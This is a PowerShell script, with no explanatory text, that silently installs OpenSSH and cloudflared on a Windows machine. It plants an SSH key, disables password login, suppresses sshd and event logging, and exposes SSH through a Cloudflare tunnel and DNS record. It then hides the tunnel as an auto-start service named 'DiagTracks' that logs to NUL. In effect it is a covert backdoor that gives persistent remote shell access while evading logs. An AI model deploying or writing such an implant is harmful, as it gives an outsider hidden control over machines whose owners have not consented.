# -------- API --------
$ApiToken  = ""
$AccountId = ""
$Domain    = ""

Set-ExecutionPolicy Bypass -Scope Process -Force
$ErrorActionPreference = 'SilentlyContinue'

# -------- Identifiers --------
$systemUuid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" MachineGuid).MachineGuid
$tunnelName = "tunnel-$systemUuid"
$hostname   = "$systemUuid.$Domain"

# -------- Install OpenSSH --------
$ProgramFilesPath = [Environment]::GetFolderPath('ProgramFiles')
$ProgramData      = [Environment]::GetFolderPath('CommonApplicationData')
$sshdConfigFile   = "$ProgramData\ssh\sshd_config"

$url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/10.0.0.0p2-Preview/OpenSSH-Win64-v10.0.0.0.msi"
$downloadPath = "$env:TEMP\OpenSSH.msi"
Start-BitsTransfer -Source $url -Destination $downloadPath



Start-Process msiexec -ArgumentList "/i `"$downloadPath`" /quiet /norestart" -Wait
Remove-Item $downloadPath -Force

"A" | powershell -File "$ProgramFilesPath\OpenSSH\FixHostFilePermissions.ps1"
"A" | powershell -File "$ProgramFilesPath\OpenSSH\FixUserFilePermissions.ps1"

$content = Get-Content $sshdConfigFile
$content = $content -replace '#PubkeyAuthentication yes','PubkeyAuthentication yes'
$content = $content -replace '#PasswordAuthentication yes','PasswordAuthentication no'
$content = $content -replace 'Match Group administrators','#Match Group administrators'
$content = $content -replace 'AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys','#AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys'
$content = $content -replace '#SyslogFacility AUTH','SyslogFacility AUTH'
$content = $content -replace '#LogLevel INFO','LogLevel QUIET'

$content | Set-Content $sshdConfigFile

$sshFolder = "$env:USERPROFILE\.ssh"
New-Item -ItemType Directory -Path $sshFolder -Force
Set-Content "$sshFolder\authorized_keys" "SSH_PUBLIC_KEY_PLACEHOLDER"
wevtutil sl "OpenSSH/Operational" /e:false
Restart-Service sshd -Force

# -------- Install Cloudflared --------
$cfUrl = "https://github.com/cloudflare/cloudflared/releases/download/2025.11.1/cloudflared-windows-amd64.msi"
$destination = "$env:TEMP\cloudflared.msi"
Start-BitsTransfer -Source $cfUrl -Destination $destination



Start-Process msiexec -ArgumentList "/i `"$destination`" /quiet /norestart" -Wait
Remove-Item $destination -Force

# -------- Resolve cloudflared from PATH --------
$cloudflared = ([Environment]::GetEnvironmentVariable("PATH","Machine") -split ';' | ForEach-Object { Join-Path $_ "cloudflared.exe" } | Where-Object { Test-Path $_ } | Select-Object -First 1)

# -------- Cloudflare API --------
$headers = @{ Authorization = "Bearer $ApiToken"; 'Content-Type'='application/json' }
$body = @{ name=$tunnelName; config_src='local' } | ConvertTo-Json
$response = Invoke-RestMethod "https://api.cloudflare.com/client/v4/accounts/$AccountId/cfd_tunnel" -Method Post -Headers $headers -Body $body
$tunnelId = $response.result.id
$token = $response.result.token
# -------- Configure Tunnel --------
$ingress = @(
    @{ hostname=$hostname; service='ssh://127.0.0.1:22' },
    @{ service='http_status:404' }
)
$configBody = @{ config=@{ ingress=$ingress } } | ConvertTo-Json -Depth 10
Invoke-RestMethod "https://api.cloudflare.com/client/v4/accounts/$AccountId/cfd_tunnel/$tunnelId/configurations" -Method Put -Headers $headers -Body $configBody
$zoneId = (Invoke-RestMethod "https://api.cloudflare.com/client/v4/zones?name=$Domain" -Headers $headers).result[0].id
$dnsBody = @{ type='CNAME'; name=$hostname; content="$tunnelId.cfargotunnel.com"; proxied=$true } | ConvertTo-Json
Invoke-RestMethod "https://api.cloudflare.com/client/v4/zones/$zoneId/dns_records" -Method Post -Headers $headers -Body $dnsBody

# -------- Service --------
$svcName = "DiagTracks"
New-Service -Name $svcName -DisplayName $svcName -BinaryPathName "`"$cloudflared`" tunnel --loglevel fatal --logfile NUL run --token $token" -StartupType Automatic
Start-Service $svcName | Out-Null
